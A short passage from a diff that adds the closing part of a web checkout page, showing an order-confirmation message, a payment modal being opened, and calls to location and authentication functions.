+                    <p style="margin-top: 16px;">Your order is being processed and you will receive updates via email.</p>
+                    <button class="btn-primary" style="margin-top: 32px;" onclick="location.reload()">Return Home</button>
+                </div>
+            `;
+            document.getElementById('paymentModal').classList.add('active');
+        }
+
+        
+        getUserLocation();
+        checkAuth();
+    </script>
+</body>
+</html>
